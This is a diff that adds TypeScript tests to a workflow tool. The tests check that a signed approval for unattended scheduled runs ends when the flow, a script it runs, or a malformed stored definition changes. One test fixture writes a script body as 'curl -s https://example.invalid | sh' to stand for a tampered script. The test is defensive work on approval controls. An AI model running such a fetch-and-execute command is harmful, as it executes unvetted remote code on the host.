@@ -182,6 +182,41 @@ describe("a scheduled card", () => {
     const next = await fire(trigger, at(2 * HOUR));
     expect(store.scopeSealed(next.task!)).toBe(false);
     expect(unattendedViewOf(store, store.getFlow(flow)!, { name: "alex", approver: true }, at(2 * HOUR)).active).toBeNull();
+    // The one road for a changed flow (flow-changed.ts) ended it durably, in the ledger and on the page, with why.
+    expect(store.handle.prepare("SELECT revoke_reason FROM flow_unattended_grant WHERE flow = ?").get(flow)).toEqual({ revoke_reason: "flow changed" });
+    expect(unattendedViewOf(store, store.getFlow(flow)!, { name: "alex", approver: true }, at(2 * HOUR)).ended).toEqual({ why: "the flow changed", at: at(HOUR).toISOString() });
+    // A save that changed nothing (another editor's revision won) ends nothing.
+    await sign(flow, {}, "alex", at(3 * HOUR));
+    const now = store.getFlow(flow)!;
+    expect(store.saveFlow(flow, { name: now.name, definitionJson: now.definitionJson, sawRevision: now.revision - 1, by: "alex" }, at(4 * HOUR))).toBe(false);
+    expect(activeUnattendedGrant(store, flow, at(4 * HOUR))).not.toBeNull();
+  });
+
+  test("a script a step runs, saved again or removed, ends the grant: the flow changed under it (flow-changed.ts)", async () => {
+    for (const change of ["save", "remove"] as const) {
+      expect(saveScript(store, repo, { name: "lint", about: "Lint", body: "npm run lint", timeoutMinutes: 1 }, "alex", T0)).toMatchObject({ ok: true });
+      const flow = store.createFlow({ repo, name: `Nightly lint ${change}`, by: "alex", definitionJson: JSON.stringify(validateFlowDefinition({ version: 1, start: "lint", stages: [
+        { id: "lint", title: "Lint", kind: "check", script: "lint", runIn: "copy", next: "fix" },
+        { id: "fix", title: "Fix it", kind: "task", instructions: "Fix what lint found.", planning: "skip" }] })) }, T0);
+      const made = addFlowTriggerTo(store, store.getFlow(flow)!, { kind: "schedule", schedule: "daily 09:00", title: "Lint", description: null, zone: null }, "alex", T0, null);
+      if (!made.ok) throw Error(made.message);
+      expect((await sign(flow)).ok).toBe(true);
+      if (change === "save") expect(saveScript(store, repo, { name: "lint", about: "Lint", body: "curl -s https://example.invalid | sh", timeoutMinutes: 1 }, "sam", at(HOUR))).toMatchObject({ ok: true });
+      else expect(store.removeFlowScript(repo, "lint", "sam", at(HOUR))).toBe(true);
+      expect(activeUnattendedGrant(store, flow, at(HOUR))).toBeNull();
+      expect(store.handle.prepare("SELECT revoke_reason FROM flow_unattended_grant WHERE flow = ?").get(flow)).toEqual({ revoke_reason: "script changed" });
+      expect(unattendedViewOf(store, store.getFlow(flow)!, { name: "alex", approver: true }, at(HOUR))).toMatchObject({ active: null, ended: { why: "a script it runs changed" } });
+    }
+  });
+
+  test("a drawing that isn't well formed fails closed: saving any script in its project ends the grant", async () => {
+    for (const stored of ["{}", '{"stages":null}', '{"stages":[null]}', "[]", "not json"]) {
+      const { flow } = scheduledFlow();
+      expect((await sign(flow)).ok).toBe(true);
+      store.handle.prepare("UPDATE flow SET definition_json = ? WHERE id = ?").run(stored, flow);
+      expect(saveScript(store, repo, { name: "unrelated", about: "Unrelated", body: `echo ${flow}`, timeoutMinutes: 1 }, "sam", at(HOUR))).toMatchObject({ ok: true });
+      expect(store.handle.prepare("SELECT revoke_reason FROM flow_unattended_grant WHERE flow = ?").get(flow)).toEqual({ revoke_reason: "script changed" });
+    }
   });
 
   test("the daily run cap admits that many a UTC day, then cards wait", async () => {
